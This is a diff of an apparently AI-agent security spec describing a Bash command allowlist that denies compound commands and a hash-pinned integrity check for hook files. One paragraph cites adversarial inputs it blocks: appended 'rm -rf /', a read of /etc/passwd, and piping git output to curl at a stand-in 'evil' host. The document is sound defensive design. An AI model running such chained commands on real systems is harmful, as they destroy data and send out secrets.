@@ -1563,7 +1563,7 @@ def tokenize(cmd: str) -> list[str]:
     return tokens
 ```
 
-The user-visible consequence: callers needing pipelines (`git fetch && git rebase`) must split into two separate Bash invocations. The split-validate variant (validate each segment independently against the allowlist) is documented as a v1.x backlog refinement that would relax this gate, but the deny-on-detect path was chosen because it ships zero false-negatives on adversarial inputs (`git status && rm -rf /`, `git log; cat /etc/passwd`, `git diff | curl http://evil/`) at the cost of denying legitimate compounds — a trade explicitly accepted in the W3-NEW3 closure (see CHANGELOG).
+The user-visible consequence: callers needing pipelines (`git fetch && git rebase`) must split into two separate Bash invocations. The split-validate variant (validate each segment independently against the allowlist) is documented as a v1.x backlog refinement that would relax this gate, but the deny-on-detect path was chosen because it ships zero false-negatives on adversarial inputs (`git status && rm -rf /`, `git log; cat /etc/passwd`, `git diff | curl http://evil/`) at the cost of denying legitimate compounds -- a trade explicitly accepted in the W3-NEW3 closure (see CHANGELOG).
 
 **Canonicalization at argv-shape layer (SE-N2 v0.5):** `under:` constraint paths and `denyGlobs` in git-add-explicit (and any other rule using path constraints) are canonicalized via `lib/canonicalize-path.py` BEFORE glob match. This ensures `git add C:\PROGRA~1\foo\.HUSKY\hook` (8.3 + mixed case) collapses to its long-path canonical form and matches `**/.husky/**`. Canonicalization runs at BOTH the section 12.2 argv-shape layer (Bash tool) and the section 12.3 path-guard layer (Edit/Write tools). Fixture: `deny-canonicalize-git-add-83-shortname.json`. (SE-N2 v0.5)
 
@@ -1995,7 +1995,7 @@ The hook on every fire (NOT just at launch):
 
 1. Read install-hook.ps1 bytes via atomic read-once; re-hash; compare to $ANCHOR_SHA constant hardcoded in hook source. If mismatch: DENY ALL with "denied: integrity check failed" (C7 v0.6, SE-N6 v0.6, SE-N16 v0.6). This terminates the trust chain at the hardcoded constant rather than a mutable file.
 2. Reads `lead-extension.sha256` bytes-once; verifies self-hash (last line). On self-hash failure: DENY.
-3. For each entry (lines 1-12, the v1.1.0 12-row pin set: 3 JSON + 1 nested SHA + 4 Python + 4 PowerShell — see s7 row 14 for the full enumeration): applies the atomic read-once-hash-parse contract above (SE-N8 v0.6: launch.ps1 now in pin set; W3-NEW2/Wave 3c expanded set adds secret-scan.ps1 + jsonl-watcher.ps1 + runner.ps1). Also verifies launch.ps1 hash matches manifest's `createdByImageSha256`.
+3. For each entry (lines 1-12, the v1.1.0 12-row pin set: 3 JSON + 1 nested SHA + 4 Python + 4 PowerShell -- see s7 row 14 for the full enumeration): applies the atomic read-once-hash-parse contract above (SE-N8 v0.6: launch.ps1 now in pin set; W3-NEW2/Wave 3c expanded set adds secret-scan.ps1 + jsonl-watcher.ps1 + runner.ps1). Also verifies launch.ps1 hash matches manifest's `createdByImageSha256`.
 4. Any mismatch -> DENY with generic `denied: integrity check failed`. Detailed mismatch info logged to `~/.claude/hooks/lead-pretool-hook.log` only (SE-S5 v0.4).
 5. The pinned hashes file is owned by the current user, no group/other write. `Set-Acl` enforced by `install-hook.ps1`.
 
